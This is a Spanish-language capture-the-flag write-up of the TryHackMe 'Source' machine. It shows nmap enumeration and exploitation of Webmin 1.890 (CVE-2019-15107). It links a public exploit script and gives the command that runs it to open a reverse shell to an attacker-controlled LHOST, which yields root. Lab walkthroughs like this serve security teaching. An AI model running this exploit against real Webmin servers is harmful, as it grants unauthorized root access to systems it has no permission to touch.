# Source
## 1. Introducción
### 1.1 Antecedentes
La máquina **Source** de TryHackMe es una máquina para principiantes, donde el objetivo es enumerar y explotar una vulnerabilidad conocida en **Webmin**, una herramienta de administración de sistemas basada en web, para obtener primero acceso y luego escalar privilegios hasta _root_. La máquina aprovecha una versión vulnerable de Webmin (relacionada con el exploit de _Webmin_ CVE-2019-15107) y enseña conceptos básicos de escaneo, explotación y control de sistemas comprometidos.
### 1.1 Objetivos
Objetivos esenciales de la máquina _Source_ (TryHackMe):

1. Desarrollar habilidades de enumeración
2. Explotar una vulnerabilidad web conocida (Webmin)
## 2. Enumeración
### 2.1 Reconocimiento inicial

Comenzamos verificando conectividad:
```bash
❯ ping -c 1 source.thm
```
El host respondió correctamente, confirmando que se encontraba activo en la red.
### 2.2 Nmap
Se realizó un escaneo completo de puertos para identificar servicios expuestos:
```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 10.49.138.121 -oN allports --open
```
 Puertos abiertos detectados:
 
- **22/tcp** – SSH
- **10000/tcp** – HTTP (Webmin)

Posteriormente, se ejecutó un escaneo más específico para detectar versiones y ejecutar scripts NSE:
```bash
❯ nmap -p22,10000 -Pn -sCV source.thm -oN targeted
```
 Resultados relevantes:
 
- **22: OpenSSH 7.6p1**
- **10000: MiniServ 1.890 (Webmin httpd)**

La versión 1.890 de Webmin es conocida por ser vulnerable a ejecución remota de comandos.
### 2.3 Búsqueda de vulnerabilidades
Tras identificar la versión del servicio, se realizó una búsqueda de exploits públicos asociados. Se encontró un exploit funcional en GitHub que aprovecha la vulnerabilidad **CVE-2019-15107**, permitiendo la ejecución remota de comandos sin autenticación.
```
https://github.com/ruthvikvegunta/CVE-2019-15107/blob/master/webmin_rce.py
```
## 3. Explotación
Se utilizó el exploit en Python para obtener una reverse shell hacia nuestra máquina atacante:
```bash
❯ python3 webmin_rce.py -t https://source.thm:10000 -l LHOST -p 9001
```
Donde:
- `-t` especifica el objetivo vulnerable
- `-l` indica la IP local para recibir la conexión
- `-p` define el puerto de escucha
Tras ejecutar el exploit, se obtuvo acceso inicial al sistema comprometido con privilegios de root.


